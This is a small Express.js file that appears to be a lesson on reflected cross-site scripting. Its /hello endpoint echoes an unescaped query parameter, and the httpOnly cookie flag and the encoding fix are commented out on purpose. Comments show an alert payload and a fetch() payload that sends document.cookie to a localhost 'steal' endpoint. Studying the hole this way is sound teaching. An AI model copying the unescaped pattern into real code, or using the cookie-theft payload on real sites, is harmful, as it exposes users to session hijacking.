import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(cookieParser());
// The /hello endpoint generates page output in code.
// It expects a name as a parameter to say "Hello, $name"
// and concatenates the user input to the output without escaping it.

// However this endpoint is vulnerable to Reflected XSS
// Reflected XSS: Injected scripts reflect off a web server and execute immediately,
// Occurs since user input is accepted without proper validation.
// Example: Attacker can craft the following URL and sends it to the victim
// http://localhost:3000/hello?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E

app.get("/hello", function (req, res) {
  res.cookie("sessionId", "123456", {
    // httpOnly: true, // Security: prevents JS access
  });

  //The req.query.name is directly inserted into the response
  // without sanitization, making the endpoint vulnerable
  // to cross-site scripting (XSS) if a user inputs
  // a malicious script (e.g., ?name=<script>alert('XSS')</script>).
  // http://localhost:3000/hello?name=%3Cscript%3Efetch(%27http://localhost:4000/steal?c=%27%2Bdocument.cookie)%3C/script%3E
  const name = req.query.name;

  // Use encodeURIComponent to safely handle user input
  // const name = encodeURIComponent(req.query.name);

  res.send(`Hello, ${name}`);
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
